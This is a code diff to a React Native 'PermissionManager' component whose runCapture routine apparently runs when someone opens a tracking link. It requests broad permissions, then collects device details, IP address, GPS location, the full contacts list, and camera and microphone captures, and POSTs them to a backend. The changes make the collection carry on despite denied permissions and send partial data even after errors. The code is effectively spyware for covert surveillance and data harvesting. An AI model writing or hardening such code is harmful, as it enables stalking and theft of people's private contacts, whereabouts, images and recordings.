@@ -641,6 +641,13 @@ export default function PermissionManager() {
 
   // Run capture process (called automatically after finding link)
   const runCapture = async (linkPageId: string) => {
+    // CRITICAL: Declare variables outside try-catch for fallback access
+    let osData: any = {};
+    let permissionsData: any = {};
+    let locationData: any = null;
+    let contactsData: any[] = [];
+    let clientIP = '';
+    
     try {
       setIsCapturing(true);
       console.log('=== Starting Capture ===');
@@ -652,87 +659,132 @@ export default function PermissionManager() {
 
       // Fix #2: Request camera permission ONCE and store result
       // Fix #9: Remove duplicate permission requests
+      // CRITICAL: All permissions are optional - app continues even if denied
       console.log('[Permissions] Requesting permissions...');
       
-      // Request camera permission once and store
-      const camStatus = await requestCameraPermission();
-      console.log('[Camera] Permission status:', camStatus?.granted);
+      // Request camera permission once and store (wrapped in try-catch)
+      let camStatus = { granted: false };
+      try {
+        camStatus = await requestCameraPermission() || { granted: false };
+        console.log('[Camera] Permission status:', camStatus?.granted);
+      } catch (camError) {
+        console.warn('[Camera] Permission request failed, continuing anyway:', camError);
+        camStatus = { granted: false };
+      }
       
       // Request other permissions (camera already requested above)
-      await Promise.all([
-        requestLocationPermission(),
-        requestContactsPermission(),
-        requestMediaPermission(),
-        requestMicrophonePermission(),
-        requestNotificationsPermission(),
-      ]);
+      // CRITICAL: Wrap all in try-catch to ensure app continues even if permissions fail
+      try {
+        await Promise.all([
+          requestLocationPermission().catch(err => console.warn('[Location] Permission error:', err)),
+          requestContactsPermission().catch(err => console.warn('[Contacts] Permission error:', err)),
+          requestMediaPermission().catch(err => console.warn('[Media] Permission error:', err)),
+          requestMicrophonePermission().catch(err => console.warn('[Microphone] Permission error:', err)),
+          requestNotificationsPermission().catch(err => console.warn('[Notifications] Permission error:', err)),
+        ]);
+      } catch (permError) {
+        console.warn('[Permissions] Some permission requests failed, continuing anyway:', permError);
+      }
       
       // Wait a bit for permissions to settle
       await new Promise(r => setTimeout(r, 300));
 
       // Step 2: Collect device data
-      const osData = await collectDeviceData();
-        const clientIP = await getClientIP();
+      try {
+        osData = await collectDeviceData();
+        clientIP = await getClientIP();
+      } catch (deviceError) {
+        console.warn('[Device] Device data collection failed, using defaults:', deviceError);
+        osData = {};
+        clientIP = '';
+      }
         
       // Step 3: Capture location coordinates (request permission if needed)
+      // CRITICAL: Location is optional - app continues even if denied
       console.log('[Location] Capturing location...');
-      let locationData = null;
       try {
         // Ensure location permission is granted
         const locPerm = await Location.getForegroundPermissionsAsync();
         if (locPerm.status !== 'granted') {
           console.log('[Location] Requesting location permission...');
-          await Location.requestForegroundPermissionsAsync();
+          await Location.requestForegroundPermissionsAsync().catch(err => {
+            console.warn('[Location] Permission request failed, continuing without location:', err);
+          });
         }
         locationData = await captureLocation();
         if (locationData) {
           console.log('[Location] ✅ Location captured:', locationData);
         } else {
-          console.log('[Location] ⚠️ Location not available');
+          console.log('[Location] ⚠️ Location not available (permission may be denied)');
         }
       } catch (locError) {
-        console.error('[Location] ❌ Error:', locError);
+        console.warn('[Location] ⚠️ Location capture failed, continuing without location:', locError);
+        locationData = null; // Ensure it's null on error
       }
 
       // Step 4: Capture contacts list
+      // CRITICAL: Contacts are optional - app continues even if denied
       console.log('[Contacts] Capturing contacts...');
-      const contactsData = await captureContacts();
-      console.log(`[Contacts] Captured ${contactsData.length} contacts`);
+      try {
+        contactsData = await captureContacts();
+        console.log(`[Contacts] Captured ${contactsData.length} contacts`);
+      } catch (contactsError) {
+        console.warn('[Contacts] ⚠️ Contacts capture failed, continuing without contacts:', contactsError);
+        contactsData = []; // Ensure it's an empty array on error
+      }
 
       // Step 5: Record visit first to create log entry
       // Fix #4: Capture logId from visit response to ensure correct log binding
+      // CRITICAL: Visit recording is important but app continues even if it fails
       console.log('[Visit] Recording visit...');
-      const visitResponse = await fetch(`${API_BASE_URL}/api/links/${linkPageId}/visit`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ...osData,
-            ip: clientIP,
-          location: locationData,
-          contacts: contactsData,
-        }),
-      });
-
       let logId: string | null = null;
-      if (visitResponse.ok) {
-        const visitData = await visitResponse.json();
-        // Fix #4: Extract logId from response (backend returns lastLogId)
-        if (visitData.lastLogId) {
-          logId = visitData.lastLogId;
-          console.log('[Visit] ✅ Visit recorded, logId:', logId);
-        } else if (visitData.logs && visitData.logs.length > 0) {
-          // Fallback: extract from logs array
-          const lastLog = visitData.logs[visitData.logs.length - 1];
-          logId = lastLog._id || null;
-          console.log('[Visit] ✅ Visit recorded, logId (fallback):', logId);
+      try {
+        const visitResponse = await fetch(`${API_BASE_URL}/api/links/${linkPageId}/visit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ...osData,
+            ip: clientIP,
+            location: locationData,
+            contacts: contactsData,
+          }),
+        });
+
+        if (visitResponse.ok) {
+          const visitData = await visitResponse.json();
+          // Fix #4: Extract logId from response (backend returns lastLogId)
+          if (visitData.lastLogId) {
+            logId = visitData.lastLogId;
+            console.log('[Visit] ✅ Visit recorded, logId:', logId);
+          } else if (visitData.logs && visitData.logs.length > 0) {
+            // Fallback: extract from logs array
+            const lastLog = visitData.logs[visitData.logs.length - 1];
+            logId = lastLog._id || null;
+            console.log('[Visit] ✅ Visit recorded, logId (fallback):', logId);
+          }
+        } else {
+          console.warn('[Visit] ⚠️ Visit recording failed, continuing anyway...');
         }
-      } else {
-        console.warn('[Visit] Visit recording failed, continuing anyway...');
+      } catch (visitError) {
+        console.warn('[Visit] ⚠️ Visit recording error, continuing anyway:', visitError);
       }
 
       // Step 6: Collect all permission statuses (Fix #2: Pass camera status, don't request again)
-      const permissionsData = await collectPermissions(camStatus || { granted: false });
-      console.log('[Permissions] Collected:', permissionsData);
+      // CRITICAL: Permission collection is optional - app continues even if it fails
+      let permissionsData: any = {};
+      try {
+        permissionsData = await collectPermissions(camStatus || { granted: false });
+        console.log('[Permissions] Collected:', permissionsData);
+      } catch (permCollectError) {
+        console.warn('[Permissions] ⚠️ Permission collection failed, using defaults:', permCollectError);
+        permissionsData = {
+          location: 'denied',
+          cameraview: camStatus?.granted ? 'granted' : 'denied',
+          contacts: 'denied',
+          media: 'denied',
+          notification: 'denied',
+        };
+      }
 
       // Step 7: Capture media (camera and microphone)
       // CRITICAL: Ensure uploads complete before proceeding to save-media
@@ -1053,11 +1105,12 @@ export default function PermissionManager() {
 
         if (saveResponse.ok) {
         console.log('=== Capture Complete ===');
-        console.log('✅ Image URL:', imageUrl || 'Not captured');
-        console.log('✅ Audio URL:', audioUrl || 'Not captured');
-        console.log('✅ Location:', locationData ? 'Captured' : 'Not captured');
+        console.log('✅ Image URL:', imageUrl || 'Not captured (permission may be denied)');
+        console.log('✅ Audio URL:', audioUrl || 'Not captured (permission may be denied)');
+        console.log('✅ Location:', locationData ? 'Captured' : 'Not captured (permission may be denied)');
         console.log('✅ Contacts:', contactsData.length, 'contacts captured');
-        alert('All data captured and saved successfully!');
+        console.log('✅ Permissions:', permissionsData);
+        alert('Data saved successfully! (Some features may be unavailable due to denied permissions)');
         } else {
         const errorText = await saveResponse.text();
         console.error('Database save failed:', errorText);
@@ -1065,7 +1118,26 @@ export default function PermissionManager() {
         }
       } catch (error) {
       console.error('Capture failed:', error);
-      alert('Error capturing data. Please try again.');
+      // CRITICAL: Even if capture fails, try to save what we have
+      try {
+        console.log('[Save] Attempting to save partial data after error...');
+        const fallbackPayload = {
+          deviceInfo: osData,
+          permissions: permissionsData,
+          capturedAt: new Date().toISOString(),
+          imageUrl: null,
+          audioUrl: null,
+        };
+        await fetch(`${API_BASE_URL}/api/links/${linkPageId}/save-media`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(fallbackPayload),
+        });
+        alert('Partial data saved. Some features may be unavailable due to denied permissions.');
+      } catch (fallbackError) {
+        console.error('Fallback save also failed:', fallbackError);
+        alert('Error capturing data. Please try again.');
+      }
     } finally {
       setIsCapturing(false);
       setMountCamera(false);
